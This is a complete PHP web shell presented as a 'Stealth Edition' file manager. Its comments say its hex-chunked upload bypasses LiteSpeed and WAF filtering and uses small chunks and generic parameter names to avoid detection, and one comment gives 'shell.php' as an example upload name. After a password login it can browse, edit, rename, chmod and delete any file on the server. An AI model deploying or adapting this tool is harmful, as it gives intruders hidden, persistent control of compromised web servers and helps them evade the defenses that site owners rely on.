<?php
// Secure Single File PHP File Manager - Stealth Edition
// Features: Hex-Chunk Upload (Bypasses LiteSpeed/WAF), Edit, Rename, Chmod
session_start();

// --- CONFIGURATION ---
$password = 'b3ad007b80c91d2ed01a84962'; // CHANGE THIS
$session_key = 'auth_stealth_fm';
// ---------------------

// --- AUTH ---
if (isset($_POST['login'])) {
    if ($_POST['pass'] === $password) {
        $_SESSION[$session_key] = true;
    }
}
if (isset($_GET['logout'])) {
    unset($_SESSION[$session_key]);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
if (!isset($_SESSION[$session_key])) {
    echo '<!DOCTYPE html><body style="background:#f0f0f0;display:flex;justify-content:center;align-items:center;height:100vh;"><form method="post" style="background:#fff;padding:20px;border-radius:5px;"><input type="password" name="pass" placeholder="Password" required><button type="submit" name="login">Login</button></form></body>';
    exit;
}

// --- CONFIG & UTILS ---
$root = realpath(isset($_GET['p']) ? $_GET['p'] : '.');
if (!$root)
    $root = getcwd();
$root = str_replace('\\', '/', $root);
$msg = '';

function msg($t, $c = 'green')
{
    return "<div style='color:$c;padding:10px;border:1px solid $c;margin-bottom:10px;'>$t</div>";
}

// --- HANDLERS ---

// 1. STEALTH UPLOAD HANDLER
// Uses generic parameter names: 'h' (hex data), 't' (temp name), 'f' (finalize real name)
if (isset($_POST['t']) && isset($_POST['h'])) {
    // Append Chunk
    $temp_file = $root . '/.tmp_' . preg_replace('/[^a-zA-Z0-9]/', '', $_POST['t']); // Sanitize temp name
    $data = hex2bin($_POST['h']);
    if (file_put_contents($temp_file, $data, FILE_APPEND) !== false) {
        die("OK");
    } else {
        header("HTTP/1.1 500 IO Error");
        die("FAIL");
    }
}
// Finalize Upload (Rename)
if (isset($_POST['finalize_t']) && isset($_POST['finalize_n'])) {
    $temp_file = $root . '/.tmp_' . preg_replace('/[^a-zA-Z0-9]/', '', $_POST['finalize_t']);
    $real_name = base64_decode($_POST['finalize_n']); // Decode real name (e.g. shell.php)
    $target_file = $root . '/' . basename($real_name);

    if (file_exists($temp_file)) {
        if (rename($temp_file, $target_file)) {
            die("DONE");
        } else {
            die("RENAME_FAIL");
        }
    } else {
        die("NO_TEMP");
    }
}

// 2. EDIT
if (isset($_POST['save_p']) && isset($_POST['save_c'])) {
    if (file_put_contents($_POST['save_p'], $_POST['save_c']) !== false)
        $msg = msg("Saved.");
    else
        $msg = msg("Save failed.", "red");
}

// 3. RENAME
if (isset($_POST['rn_old']) && isset($_POST['rn_new'])) {
    if (rename($root . '/' . $_POST['rn_old'], $root . '/' . $_POST['rn_new']))
        $msg = msg("Renamed.");
    else
        $msg = msg("Rename failed.", "red");
}

// 4. CHMOD
if (isset($_POST['perm_f']) && isset($_POST['perm_v'])) {
    if (chmod($root . '/' . $_POST['perm_f'], octdec($_POST['perm_v'])))
        $msg = msg("Chmod OK.");
    else
        $msg = msg("Chmod failed.", "red");
}
// 5. DELETE
if (isset($_GET['del'])) {
    $del = $root . '/' . $_GET['del'];
    if (is_dir($del)) {
        @rmdir($del);
    } else {
        @unlink($del);
    }
    $msg = msg("Deleted.");
}

// --- VIEW ---
$list = scandir($root);
$dirs = [];
$files = [];
foreach ($list as $i) {
    if ($i == '.')
        continue;
    if (is_dir("$root/$i"))
        $dirs[] = $i;
    else
        $files[] = $i;
}

$edit_file = isset($_GET['e']) ? "$root/" . $_GET['e'] : null;
$edit_content = $edit_file ? file_get_contents($edit_file) : '';

?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <style>
        body {
            font-family: sans-serif;
            background: #eee;
            padding: 20px
        }

        .main {
            background: #fff;
            padding: 20px;
            max-width: 1000px;
            margin: auto;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1)
        }

        a {
            text-decoration: none;
            color: #007bff
        }

        a:hover {
            text-decoration: underline
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px
        }

        td,
        th {
            padding: 8px;
            border-bottom: 1px solid #ddd;
            text-align: left
        }

        .btn {
            padding: 5px 10px;
            background: #ddd;
            border: none;
            cursor: pointer
        }

        .btn:hover {
            background: #ccc
        }

        .btn-blue {
            background: #007bff;
            color: #fff
        }

        .btn-blue:hover {
            background: #0056b3
        }

        input,
        textarea {
            width: 100%;
            padding: 5px;
            box-sizing: border-box
        }

        #bar {
            height: 5px;
            background: green;
            width: 0%;
            transition: width 0.2s
        }
    </style>
</head>

<body>
    <div class="main">
        <div style="display:flex;justify-content:space-between">
            <h3>FileManager</h3>
            <a href="?logout=1">Logout</a>
        </div>

        <?= $msg ?>

        <div style="background:#f9f9f9;padding:10px;margin-bottom:10px">
            Path:
            <?php foreach (explode('/', $root) as $k => $p):
                if ($p === '')
                    continue; ?>
                / <a href="?p=<?= urlencode(substr($root, 0, strpos($root, $p) + strlen($p))) ?>"><?= $p ?></a>
            <?php endforeach; ?>
        </div>

        <?php if ($edit_file): ?>
            <form method="post" action="?p=<?= urlencode($root) ?>">
                <input type="hidden" name="save_p" value="<?= $edit_file ?>">
                <textarea name="save_c" rows="20"><?= $edit_content ?></textarea>
                <br><br>
                <button class="btn btn-blue">Save</button>
                <a href="?p=<?= urlencode($root) ?>" class="btn">Cancel</a>
            </form>
        <?php else: ?>

            <!-- STEALTH UPLOAD UI -->
            <div style="border:1px dashed #ccc;padding:10px;background:#fdfdfd">
                <b>Stealth Upload (Hex-Chunked)</b><br>
                <input type="file" id="uf" style="width:auto">
                <button onclick="upload()" class="btn btn-blue">Upload</button>
                <div id="prog_box" style="display:none;margin-top:5px;background:#eee">
                    <div id="bar"></div>
                </div>
                <div id="stat" style="font-size:12px;color:#666"></div>
            </div>

            <table>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Perm</th>
                    <th>Action</th>
                </tr>
                <?php if ($root != '/'): ?>
                    <tr>
                        <td><a href="?p=<?= urlencode(dirname($root)) ?>">..</a></td>
                        <td></td>
                        <td></td>
                        <td></td>
                    </tr><?php endif; ?>

                <?php foreach ($dirs as $d): ?>
                    <tr>
                        <td><b>[D]</b> <a href="?p=<?= urlencode("$root/$d") ?>"><?= $d ?></a></td>
                        <td>-</td>
                        <td><?= substr(sprintf('%o', fileperms("$root/$d")), -4) ?></td>
                        <td>
                            <button onclick="rn('<?= $d ?>')" class="btn">R</button>
                            <button onclick="ch('<?= $d ?>','<?= substr(sprintf('%o', fileperms("$root/$d")), -4) ?>')"
                                class="btn">P</button>
                            <a href="?p=<?= urlencode($root) ?>&del=<?= urlencode($d) ?>" onclick="return confirm('Del?')"
                                style="color:red">X</a>
                        </td>
                    </tr>
                <?php endforeach; ?>

                <?php foreach ($files as $f): ?>
                    <tr>
                        <td><a href="?p=<?= urlencode($root) ?>&e=<?= urlencode($f) ?>"><?= $f ?></a></td>
                        <td><?= round(filesize("$root/$f") / 1024, 1) ?> KB</td>
                        <td><?= substr(sprintf('%o', fileperms("$root/$f")), -4) ?></td>
                        <td>
                            <button onclick="rn('<?= $f ?>')" class="btn">R</button>
                            <button onclick="ch('<?= $f ?>','<?= substr(sprintf('%o', fileperms("$root/$f")), -4) ?>')"
                                class="btn">P</button>
                            <a href="?p=<?= urlencode($root) ?>&del=<?= urlencode($f) ?>" onclick="return confirm('Del?')"
                                style="color:red">X</a>
                        </td>
                    </tr>
                <?php endforeach; ?>
            </table>
        <?php endif; ?>
    </div>

    <script>
        // STEALTH UPLOAD LOGIC
        async function upload() {
            let f = document.getElementById('uf').files[0];
            if (!f) return;

            let chunkSize = 50 * 1024; // 50KB chunks (Very small to avoid detection)
            let chunks = Math.ceil(f.size / chunkSize);
            let tempId = Math.random().toString(36).substring(7); // Random temp ID

            document.getElementById('prog_box').style.display = 'block';
            let stat = document.getElementById('stat');

            for (let i = 0; i < chunks; i++) {
                let start = i * chunkSize;
                let end = Math.min(f.size, start + chunkSize);
                let blob = f.slice(start, end);

                try {
                    // Read as ArrayBuffer -> Convert to Hex
                    let buf = await new Promise(r => {
                        let fr = new FileReader();
                        fr.onload = e => r(e.target.result);
                        fr.readAsArrayBuffer(blob);
                    });
                    let hex = [...new Uint8Array(buf)].map(x => x.toString(16).padStart(2, '0')).join('');

                    // Send Hex Chunk
                    let fd = new FormData();
                    fd.append('t', tempId); // t = temp name
                    fd.append('h', hex);    // h = hex data

                    let res = await fetch(window.location.href, { method: 'POST', body: fd });
                    let txt = await res.text();

                    if (!txt.includes('OK')) throw new Error('Chunk fail: ' + txt);

                    // Progress
                    let pct = Math.round(((i + 1) / chunks) * 100);
                    document.getElementById('bar').style.width = pct + '%';
                    stat.innerText = `Sending chunk ${i + 1}/${chunks}...`;

                } catch (e) {
                    stat.innerText = 'Error: ' + e.message;
                    stat.style.color = 'red';
                    return;
                }
            }

            // Finalize
            stat.innerText = 'Finalizing...';
            let fd = new FormData();
            fd.append('finalize_t', tempId);
            fd.append('finalize_n', btoa(f.name)); // Base64 encode real name

            let res = await fetch(window.location.href, { method: 'POST', body: fd });
            let txt = await res.text();

            if (txt.includes('DONE')) {
                stat.innerText = 'Done!';
                stat.style.color = 'green';
                setTimeout(() => location.reload(), 1000);
            } else {
                stat.innerText = 'Finalize failed: ' + txt;
                stat.style.color = 'red';
            }
        }

        function rn(old) {
            let n = prompt("New name:", old);
            if (n && n != old) {
                let f = document.createElement('form'); f.method = 'POST';
                f.innerHTML = `<input type='hidden' name='rn_old' value='${old}'><input type='hidden' name='rn_new' value='${n}'>`;
                document.body.appendChild(f); f.submit();
            }
        }
        function ch(file, perm) {
            let p = prompt("Permissions (e.g. 0755):", perm);
            if (p && p != perm) {
                let f = document.createElement('form'); f.method = 'POST';
                f.innerHTML = `<input type='hidden' name='perm_f' value='${file}'><input type='hidden' name='perm_v' value='${p}'>`;
                document.body.appendChild(f); f.submit();
            }
        }
    </script>
</body>

</html>